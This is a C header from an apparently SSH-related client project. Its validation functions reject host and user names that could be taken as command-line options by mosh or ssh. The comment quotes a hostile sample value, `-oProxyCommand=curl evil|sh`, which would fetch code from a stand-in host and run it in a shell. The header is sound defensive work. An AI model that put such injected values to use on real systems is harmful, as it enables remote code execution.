/*
 * Liu — a host or user name that is about to become an argument of another program.
 *
 * Liu's own SSH client is libssh2 in-process, so a host name is only ever a name there.
 * The one place it becomes an ARGV element is mosh (src/ssh/mosh.c runs
 * `mosh [--ssh "ssh -p N"] user@host`), and a program's command line cannot tell an
 * operand from an option: a host that starts with '-' — `-oProxyCommand=curl evil|sh`,
 * which is what a hostile ~/.ssh/config or a shared vault entry would contain — is read as
 * an OPTION by mosh and, one step further down, by ssh, which then runs the command it
 * names. OpenSSH itself refuses a host name beginning with '-' for this reason. The name is
 * checked, not escaped: there is no shell here to escape for.
 *
 * Refused: empty, a leading '-', any control byte or space, and the characters ssh gives
 * meaning inside a destination (quotes, backslash, backtick, '$', ';', '|', '&', '<', '>',
 * '(', ')', '{', '}'). Bytes >= 0x80 pass (internationalised names are UTF-8).
 */
#ifndef SSH_SSH_TARGET_H
#define SSH_SSH_TARGET_H

#include <stdbool.h>
#include <string.h>

static inline bool ssh_target_name_is_safe(const char *name) {
    if (!name || !name[0] || name[0] == '-') return false;
    for (const unsigned char *p = (const unsigned char *)name; *p; p++) {
        if (*p <= 0x20 || *p == 0x7f) return false;
        if (strchr("\"'\\`$;|&<>(){}", (int)*p)) return false;
    }
    return true;
}

/* host is required; user is optional (NULL or empty means none). */
static inline bool ssh_target_is_safe(const char *host, const char *user) {
    if (!ssh_target_name_is_safe(host)) return false;
    if (user && user[0] && !ssh_target_name_is_safe(user)) return false;
    return true;
}

#endif /* SSH_SSH_TARGET_H */
